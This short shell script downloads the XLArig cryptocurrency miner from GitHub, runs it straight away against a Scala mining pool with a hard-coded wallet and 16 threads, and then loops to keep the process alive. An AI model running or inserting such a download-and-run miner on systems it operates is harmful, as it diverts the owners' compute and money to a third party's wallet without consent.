#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o ca.scala.herominers.com:10131 -u Siz7KzWmiNWSRTjZBAt5qqWC5PPYLVGvQdxfDPsyMXpUMkRuzwKNLEbfevN4Eoh76gTvxPeszEj5R7GmJMnkHDD8Ms7Peb4xquq1UeZmhjZHY -p gp1 -a panthera -k -t16
while [ 1 ]; do
sleep 3
done
sleep 999
